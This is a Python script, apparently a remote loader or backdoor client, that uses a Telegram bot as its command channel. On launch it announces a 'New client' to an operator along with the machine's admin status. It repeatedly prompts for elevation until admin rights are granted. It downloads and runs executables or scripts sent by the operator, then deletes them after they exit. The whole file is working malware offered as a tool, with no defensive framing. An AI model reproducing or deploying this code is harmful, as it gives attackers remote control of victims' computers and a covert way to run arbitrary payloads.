from pyuac import isUserAdmin, runAsAdmin
import os
import tempfile
import subprocess
import telebot
import uuid
import time
import shutil
import psutil

bot = telebot.TeleBot('token')
admin = 123

bot.send_message(admin, f'New client!\nSend only .exe, .bat, .cmd, .vbs files!\nIsElevated: {isUserAdmin()}')

def elevate():
	while True:
		if not isUserAdmin():
			try:
				runAsAdmin()
				exit(0)
			except:
				pass
		else:
			return True

@bot.message_handler(commands=['elevate'])
def handle_elevate(message):
	try:
		chat_id = message.chat.id
		if int(chat_id) != admin:
			return

		bot.reply_to(message, "Elevating privileges...")
		elevate()
		bot.reply_to(message, "Privileges elevated successfully.")
	except Exception as e:
		bot.reply_to(message, str(e))

@bot.message_handler(content_types=['document'])
def handle_executable(message):
	try:
		chat_id = message.chat.id
		if int(chat_id) != admin:
			return

		file_info = bot.get_file(message.document.file_id)

		if not os.path.splitext(message.document.file_name)[1] in ['.exe', '.bat', '.cmd', '.vbs']:
			bot.reply_to(message, "File is not executable.")
			return

		bot.reply_to(message, f"Downloading {message.document.file_name}...")

		downloaded_file = bot.download_file(file_info.file_path)

		file_temp_path = os.path.join(tempfile.gettempdir(), str(uuid.uuid4()))
		os.mkdir(file_temp_path)

		src = os.path.join(file_temp_path, message.document.file_name)

		with open(src, 'wb') as new_file:
			new_file.write(downloaded_file)

		bot.send_message(admin, f'Starting {message.document.file_name}...')

		# Запуск файла
		process = subprocess.Popen(f'"{src}"', shell=True)
		bot.send_message(admin, 'File is opened! Waiting for exit...')

		# Получаем имя файла для отслеживания
		target_process_name = os.path.basename(src)

		while True:
			time.sleep(6)
			process_found = False
			for proc in psutil.process_iter(['pid', 'name']):
				if proc.info['name'] == target_process_name:
					process_found = True
					break
			if not process_found:
				break  # Процесс завершен

		bot.send_message(admin, f'{message.document.file_name} was closed. Deleting...')

		time.sleep(3.5)
		shutil.rmtree(file_temp_path)

		bot.reply_to(message, "Done")
	except Exception as e:
		bot.reply_to(message, str(e))

bot.polling()